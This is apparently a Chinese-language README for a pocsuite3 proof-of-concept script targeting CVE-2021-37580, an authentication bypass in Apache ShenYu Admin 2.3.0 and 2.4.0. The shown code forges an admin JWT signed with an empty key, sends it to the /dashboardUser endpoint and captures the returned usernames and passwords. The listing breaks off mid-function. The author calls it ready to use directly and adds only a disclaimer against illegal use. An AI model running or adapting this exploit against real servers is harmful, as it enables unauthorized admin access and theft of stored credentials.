# Apache_ShenYu_Admin
 Apache_ShenYu_Admin

# CVE-2021-37580
编写语言：python3

部分代码展示

````from collections import OrderedDict
from urllib.parse import urljoin
import re,jwt,time
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict,OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from pocsuite3.lib.core.enums import HTTP_HEADER


class POC(POCBase):
    vulID = '0'# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'#默认为1
    author = ['luckying']#  PoC作者的大名
    vulDate = '2021-11-18' #漏洞公开的时间,不知道就写今天
    createDate = '2021-11-18'# 编写 PoC 的日期
    updateDate = '2021-11-18'# PoC 更新的时间,默认和编写时间一样
    references = ['https://nosec.org/home/detail/4906.html']# 漏洞地址来源,0day不用写
    name = 'Apache ShenYu Admin 身份验证绕过漏洞 (CVE-2021-37580)'# PoC 名称
    appPowerLink = 'https://shenyu.apache.org'# 漏洞厂商主页地址
    appName = 'Apache ShenYu'# 漏洞应用名称
    appVersion = """Apache ShenYu 2.3.0,2.4.0"""# 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Apache ShenYu Admin 身份验证绕过漏洞 (CVE-2021-37580)
    '''# 漏洞简要描述
    samples = ['']# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' 
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def token(self):
        playload={
        "userName": "admin",
        "exp":int(time.time())
        }
        #生成jwt，编码，''是密钥，这里不限
        token = str(jwt.encode(playload,'',algorithm='HS256'))
        return token
    
    def _verify(self):
        result = {}
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
            'X-Access-Token': self.token()
                    }
        path = "/dashboardUser"
        url = self.url + path
        try:
            resq = requests.get(url=url,headers=headers,timeout=5)
            if 'userName' in resq.text and 'password' in resq.text:
                #print(resq.text)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['messages'] = resq.text
        except Exception as e:
            return 
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
````
#### 开源化，已注释，可直接套用

#### 脚本为漏洞验证文件
请勿用于非法用途，造成一切后果自行承担！！

# 有问题？您可以选择自行提交更改，或者联系我们

## Email：zc15108972790@163.com

